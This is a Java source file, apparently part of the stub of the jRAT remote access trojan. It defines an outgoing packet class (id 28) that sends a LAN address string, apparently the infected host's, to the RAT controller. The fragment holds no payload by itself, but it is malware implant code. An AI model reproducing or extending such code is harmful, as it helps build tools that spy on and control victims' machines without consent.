package pro.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet28InitLanAddress extends AbstractOutgoingPacket {
	
	private String address;
	
	public Packet28InitLanAddress(String address) {
		this.address = address;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(address);
	}

	@Override
	public byte getPacketId() {
		return (byte) 28;
	}
}